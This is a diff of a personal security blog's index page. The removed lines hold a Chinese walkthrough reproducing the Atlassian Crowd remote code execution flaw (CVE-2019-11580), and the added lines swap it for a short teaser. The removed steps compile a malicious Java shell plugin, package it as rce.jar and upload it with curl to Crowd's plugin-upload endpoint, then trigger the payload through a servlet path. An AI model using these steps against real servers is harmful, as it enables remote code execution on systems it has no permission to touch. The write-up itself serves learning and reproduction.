@@ -84,28 +84,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Atlassian-Crowd-RCE漏洞分析"><a href="#Atlassian-Crowd-RCE漏洞分析" class="headerlink" title="Atlassian Crowd RCE漏洞分析"></a>Atlassian Crowd RCE漏洞分析</h1><p>复现了快三天吧，效率还是太低了，从搭建环境到完成复现其实实际上用的时间并不是很多，但却是中间开小差之类的浪费了很多的时间，所以还是要在集中注意力这方面上多努力才行。毕竟安全，只有静下心来不浮躁才能进步。实在是不希望以后当个脚本小子。。。</p>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
-<li>Crowd版本<br>  2.1.0 &lt;= version &lt; 3.0.5<br>  3.1.0 &lt;= version &lt; 3.1.6<br>  3.2.0 &lt;= version &lt; 3.2.8<br>  3.3.0 &lt;= version &lt; 3.3.5<br>  3.4.0 &lt;= version &lt; 3.4.4</li>
-</ul>
-<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>其实安装很简单，就是两个东西</p>
-<ul>
-<li>JDK，我选择的版本是1.8.0的，感觉这个版本的比较稳定，很多东西都兼容。</li>
-<li>接着就是按照上面漏洞环境的版本安装一个crowd就行了，过程也是极其简单的。<br>我把crowd理解成一个扩展的tomcat吧，反正只需要下载下来解压好后就可以直接运行了，什么都不需要配置的。之所以花那么多时间，我觉得还是因为经验不够，我一开始还以为需要tomcat + JDK + mysql的环境才行，真是傻子。。。</li>
-</ul>
-<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><p>这里就先放一下攻击的步骤吧</p>
-<ul>
-<li>先下载一下<a href="https://github.com/lc/research/tree/master/CVE-2019-11580/atlassian-shell" target="_blank" rel="noopener">java的恶意jio本</a></li>
-<li>先是用 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp apache-tomcat/lib/servlet-api.jar com/cdl/shell/Cdl.java </span><br></pre></td></tr></table></figure>，其中，servlet-api.jar在crowd的 /crowd-webapps/pluginds/ 的文件夹下可以找到。</li>
-<li>编译好后就用 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r rce.jar atlassian-plugin.xml ./com</span><br></pre></td></tr></table></figure>这个打包一下就行了</li>
-<li>接着直接把生成的rce.jar文件上传 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k -H &quot;Content-Type: multipart/mixed&quot;   --form &quot;file_cdl=@rce.jar&quot; http://example.com:8095/crowd/admin/uploadplugin.action </span><br></pre></td></tr></table></figure> 上传后如图 <img src="/2019/07/20/CVE-2019-11580/upload.png">就代表成功上传了</li>
-<li>访问目录 /plugins/servlet/cdl 就会发现成功执行了payload</li>
-</ul>
-
+        <p>复现了快三天吧，效率还是太低了，从搭建环境到完成复现其实实际上用的时间并不是很多，但却是中间开小差之类的浪费了很多的时间，所以还是要在集中注意力这方面上多努力才行。毕竟安全，只有静下心来不浮躁才能进步。实在是不希望以后当个脚本小子。。。</p>
+        
+          <p class="article-more-link">
+            <a href="/2019/07/20/CVE-2019-11580/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/20/CVE-2019-11580/" data-id="cjybmfes6000053onjdoouord" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/20/CVE-2019-11580/" data-id="cjybmjt1a00015wonuwrxdzlm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -146,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/06/16/Init/" data-id="cjybmfesd000153on7pm0jb8k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/06/16/Init/" data-id="cjybmjt0x00005wonyp3f6ypv" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/init/">init</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/start/">start</a></li></ul>
